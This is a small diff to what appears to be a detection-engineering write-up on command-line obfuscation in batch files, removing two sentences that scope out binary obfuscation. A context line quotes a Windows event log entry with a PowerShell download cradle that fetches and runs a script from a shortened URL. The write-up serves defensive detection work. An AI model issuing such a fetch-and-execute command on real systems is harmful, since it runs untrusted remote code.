@@ -130,10 +130,6 @@ we'll see the following parent-child process creation chain in the Windows Event
  <Data Name="CommandLine">PowerShell IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')</Data> 
 ```
 
-So this subtype of binary obfuscation is considered out of scope for this issue.
-
-Therefore all binary obfuscation is considered out of scope for this issue.
-
 ### ENCODING
 
 Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. These payload encoding techniques only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files, so they are considered out of scope for this Issue.
